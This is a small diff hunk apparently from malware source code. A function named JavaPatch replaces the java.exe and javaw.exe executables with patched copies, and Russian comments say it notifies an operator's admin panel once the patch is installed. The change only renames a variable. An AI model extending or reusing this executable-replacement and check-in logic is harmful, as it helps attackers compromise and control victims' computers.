@@ -987,7 +987,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			}
 			//Подменяем яву
 			res &= ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str() );
-			res &= ReplacementExe( "javaw.exe", Patched_JawaW_Name, javaExew.str() );
+			res &= ReplacementExe( "javaw.exe", Patched_Jawaw_Name, javaExew.str() );
 			if( res )
 			{
 				//сообщаем админке, что ява патч установлен
